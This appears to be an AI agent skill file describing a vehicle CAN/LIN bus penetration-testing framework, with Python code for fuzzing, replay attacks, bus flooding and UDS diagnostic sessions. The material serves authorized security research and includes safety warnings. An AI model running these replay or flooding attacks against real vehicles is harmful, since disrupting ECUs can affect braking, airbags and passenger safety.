---
name: s800-vehicle-network-security-testing
description: Automotive network security testing framework for CAN/LIN bus penetration testing and vehicle vulnerability assessment
triggers:
  - test vehicle CAN bus security
  - perform automotive network penetration testing
  - scan for vehicle network vulnerabilities
  - fuzz CAN bus messages
  - analyze vehicle communication protocols
  - simulate automotive network attacks
  - test car cybersecurity defenses
  - conduct vehicle ECU security testing
---

# S800 Vehicle Network Security Testing Framework

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

S800 is a vehicle network security testing framework designed for penetration testing and vulnerability assessment of automotive networks including CAN (Controller Area Network), LIN (Local Interconnect Network), and other vehicle communication protocols. The framework enables security researchers and automotive engineers to identify vulnerabilities in Electronic Control Units (ECUs), test message integrity, perform fuzzing operations, and simulate various attack scenarios on vehicle networks.

**Note**: This project is marked as a test file by the author. Use with caution and only on authorized test vehicles or lab environments. Never test on production vehicles without explicit permission.

## Installation

### Prerequisites

- Python 3.7+
- CAN interface hardware (USB-CAN adapter, SocketCAN compatible device)
- Linux system with SocketCAN support (recommended) or Windows with compatible drivers

### Basic Installation

```bash
# Clone the repository
git clone https://github.com/zhu-zhu666/S800-Vehicle-Network-Security-Testing-Framework.git
cd S800-Vehicle-Network-Security-Testing-Framework

# Install dependencies
pip install -r requirements.txt

# Or install manually
pip install python-can cantools scapy
```

### Hardware Setup

For SocketCAN (Linux):

```bash
# Configure CAN interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# Verify interface
ip link show can0
```

## Core Components

### 1. CAN Bus Testing

#### Basic CAN Message Sending

```python
import can

# Initialize CAN bus connection
bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Send single CAN message
msg = can.Message(
    arbitration_id=0x123,
    data=[0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08],
    is_extended_id=False
)
bus.send(msg)

# Send periodic message
task = bus.send_periodic(msg, 0.1)  # Every 100ms
```

#### CAN Bus Sniffing

```python
import can

def monitor_can_traffic(interface='can0', duration=10):
    """Monitor CAN bus traffic"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    print(f"Monitoring CAN traffic on {interface}...")
    
    for message in bus:
        print(f"ID: 0x{message.arbitration_id:03X} Data: {' '.join(f'{b:02X}' for b in message.data)}")
        
        # Stop after duration (if implementing timeout)
        # Add your timeout logic here

# Usage
monitor_can_traffic('can0')
```

#### CAN ID Enumeration

```python
import can
import time

def enumerate_can_ids(bus, start_id=0x000, end_id=0x7FF):
    """Enumerate valid CAN IDs by sending test messages"""
    active_ids = []
    
    for can_id in range(start_id, end_id + 1):
        msg = can.Message(
            arbitration_id=can_id,
            data=[0x00] * 8,
            is_extended_id=False
        )
        
        try:
            bus.send(msg)
            # Monitor for responses (simplified)
            time.sleep(0.01)
            active_ids.append(can_id)
        except Exception as e:
            continue
    
    return active_ids

# Usage
bus = can.interface.Bus(channel='can0', bustype='socketcan')
found_ids = enumerate_can_ids(bus)
print(f"Active CAN IDs: {[hex(id) for id in found_ids]}")
```

### 2. Fuzzing Operations

#### Basic CAN Fuzzing

```python
import can
import random
import time

def fuzz_can_message(bus, target_id, num_iterations=1000):
    """Fuzz a specific CAN ID with random data"""
    print(f"Fuzzing CAN ID 0x{target_id:03X}...")
    
    for i in range(num_iterations):
        # Generate random 8-byte payload
        data = [random.randint(0, 255) for _ in range(8)]
        
        msg = can.Message(
            arbitration_id=target_id,
            data=data,
            is_extended_id=False
        )
        
        try:
            bus.send(msg)
            time.sleep(0.001)  # 1ms delay
        except Exception as e:
            print(f"Error on iteration {i}: {e}")
            continue
        
        if i % 100 == 0:
            print(f"Progress: {i}/{num_iterations}")

# Usage
bus = can.interface.Bus(channel='can0', bustype='socketcan')
fuzz_can_message(bus, 0x123, num_iterations=500)
```

#### Intelligent Fuzzing (Bit Flipping)

```python
import can

def bit_flip_fuzzing(bus, target_id, base_data):
    """Perform bit-flip fuzzing on known message"""
    print(f"Bit-flip fuzzing CAN ID 0x{target_id:03X}...")
    
    for byte_index in range(len(base_data)):
        for bit_index in range(8):
            # Create a copy and flip one bit
            fuzzed_data = list(base_data)
            fuzzed_data[byte_index] ^= (1 << bit_index)
            
            msg = can.Message(
                arbitration_id=target_id,
                data=fuzzed_data,
                is_extended_id=False
            )
            
            bus.send(msg)
            print(f"Flipped byte {byte_index}, bit {bit_index}: {fuzzed_data}")

# Usage
bus = can.interface.Bus(channel='can0', bustype='socketcan')
baseline = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]
bit_flip_fuzzing(bus, 0x456, baseline)
```

### 3. Replay Attacks

```python
import can
import time

class CANReplayAttack:
    def __init__(self, interface='can0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.captured_messages = []
    
    def capture(self, duration=10):
        """Capture CAN messages for replay"""
        print(f"Capturing messages for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            msg = self.bus.recv(timeout=1.0)
            if msg:
                self.captured_messages.append({
                    'id': msg.arbitration_id,
                    'data': list(msg.data),
                    'timestamp': msg.timestamp
                })
        
        print(f"Captured {len(self.captured_messages)} messages")
    
    def replay(self, speed_multiplier=1.0):
        """Replay captured messages"""
        if not self.captured_messages:
            print("No messages to replay")
            return
        
        print(f"Replaying {len(self.captured_messages)} messages...")
        base_time = self.captured_messages[0]['timestamp']
        start_time = time.time()
        
        for msg_data in self.captured_messages:
            # Calculate timing
            original_offset = msg_data['timestamp'] - base_time
            target_time = start_time + (original_offset / speed_multiplier)
            
            # Wait until target time
            sleep_time = target_time - time.time()
            if sleep_time > 0:
                time.sleep(sleep_time)
            
            # Send message
            msg = can.Message(
                arbitration_id=msg_data['id'],
                data=msg_data['data'],
                is_extended_id=False
            )
            self.bus.send(msg)

# Usage
replay = CANReplayAttack('can0')
replay.capture(duration=5)
replay.replay(speed_multiplier=1.0)
```

### 4. DoS Attack Simulation

```python
import can
import threading

def can_bus_flood(interface='can0', target_id=0x000, duration=10):
    """Simulate CAN bus flooding attack"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    stop_flag = threading.Event()
    
    def flood_worker():
        msg = can.Message(
            arbitration_id=target_id,
            data=[0xFF] * 8,
            is_extended_id=False
        )
        
        while not stop_flag.is_set():
            try:
                bus.send(msg)
            except Exception as e:
                print(f"Flood error: {e}")
    
    # Start flooding
    thread = threading.Thread(target=flood_worker)
    thread.start()
    
    # Run for specified duration
    threading.Timer(duration, stop_flag.set).start()
    thread.join()
    
    print("Bus flooding completed")

# Usage - CAUTION: This can disrupt vehicle systems
# Only use in isolated test environments
# can_bus_flood('can0', target_id=0x000, duration=5)
```

### 5. UDS Diagnostic Testing

```python
import can

class UDSDiagnostics:
    def __init__(self, interface='can0', ecu_id=0x7E0):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.ecu_id = ecu_id
        self.response_id = ecu_id + 0x08  # Standard offset
    
    def send_uds_request(self, service, data=[]):
        """Send UDS diagnostic request"""
        payload = [service] + data
        msg = can.Message(
            arbitration_id=self.ecu_id,
            data=payload + [0x00] * (8 - len(payload)),
            is_extended_id=False
        )
        self.bus.send(msg)
    
    def read_response(self, timeout=1.0):
        """Read UDS response"""
        msg = self.bus.recv(timeout=timeout)
        if msg and msg.arbitration_id == self.response_id:
            return list(msg.data)
        return None
    
    def read_dtc(self):
        """Read Diagnostic Trouble Codes (Service 0x19)"""
        self.send_uds_request(0x19, [0x02, 0xFF])
        response = self.read_response()
        return response
    
    def enter_diagnostic_session(self, session_type=0x03):
        """Enter diagnostic session (Service 0x10)"""
        self.send_uds_request(0x10, [session_type])
        response = self.read_response()
        return response

# Usage
uds = UDSDiagnostics('can0', ecu_id=0x7E0)
response = uds.enter_diagnostic_session(session_type=0x03)
print(f"Session response: {response}")
dtc_data = uds.read_dtc()
print(f"DTC data: {dtc_data}")
```

## Configuration

### Environment Variables

```bash
# Set CAN interface
export CAN_INTERFACE=can0

# Set CAN bitrate
export CAN_BITRATE=500000

# Enable verbose logging
export S800_DEBUG=1
```

### Configuration File Example

```python
# config.py
CONFIG = {
    'can_interface': 'can0',
    'bitrate': 500000,
    'log_level': 'INFO',
    'timeout': 5.0,
    'fuzzing': {
        'iterations': 1000,
        'delay_ms': 1,
        'random_seed': None
    },
    'target_ecu': {
        'diagnostic_id': 0x7E0,
        'response_id': 0x7E8
    }
}
```

## Common Patterns

### Safe Testing Wrapper

```python
import can
import contextlib

@contextlib.contextmanager
def safe_can_bus(interface='can0'):
    """Context manager for safe CAN bus operations"""
    bus = None
    try:
        bus = can.interface.Bus(channel=interface, bustype='socketcan')
        yield bus
    except Exception as e:
        print(f"CAN bus error: {e}")
        raise
    finally:
        if bus:
            bus.shutdown()

# Usage
with safe_can_bus('can0') as bus:
    msg = can.Message(arbitration_id=0x123, data=[0x01, 0x02])
    bus.send(msg)
```

### Logging CAN Traffic

```python
import can
import csv
from datetime import datetime

def log_can_traffic(interface='can0', output_file='can_log.csv'):
    """Log CAN traffic to CSV file"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    with open(output_file, 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(['Timestamp', 'CAN_ID', 'DLC', 'Data'])
        
        try:
            for msg in bus:
                writer.writerow([
                    datetime.now().isoformat(),
                    f"0x{msg.arbitration_id:03X}",
                    len(msg.data),
                    ' '.join(f'{b:02X}' for b in msg.data)
                ])
        except KeyboardInterrupt:
            print(f"\nLog saved to {output_file}")

# Usage
log_can_traffic('can0', 'vehicle_test_log.csv')
```

## Troubleshooting

### CAN Interface Not Found

```bash
# Check if interface exists
ip link show can0

# Bring up interface
sudo ip link set can0 up type can bitrate 500000

# Check kernel modules
lsmod | grep can
```

### Permission Denied Errors

```bash
# Add user to dialout group (for USB-CAN devices)
sudo usermod -a -G dialout $USER

# Or run with sudo (not recommended for production)
sudo python your_script.py
```

### No Messages Received

```python
# Verify bus is active
import can

bus = can.interface.Bus(channel='can0', bustype='socketcan')
print(f"Bus state: {bus.state}")

# Check for messages with extended timeout
msg = bus.recv(timeout=10.0)
if msg:
    print(f"Received: {msg}")
else:
    print("No messages - check physical connection and bitrate")
```

### Wrong Bitrate

Common automotive bitrates:
- Low-speed CAN: 125 kbps
- High-speed CAN: 500 kbps
- CAN-FD: 500 kbps/2 Mbps

```bash
# Try different bitrates
sudo ip link set can0 down
sudo ip link set can0 type can bitrate 125000
sudo ip link set can0 up
```

## Security Warnings

⚠️ **CRITICAL**: This framework is for authorized testing only. Unauthorized vehicle network testing is illegal and dangerous.

- Always work in isolated lab environments
- Never test on production vehicles without explicit authorization
- Ensure physical safety measures are in place
- Be aware that certain tests can trigger airbags or affect braking systems
- Follow responsible disclosure practices for discovered vulnerabilities
- Comply with local laws and regulations regarding vehicle modification
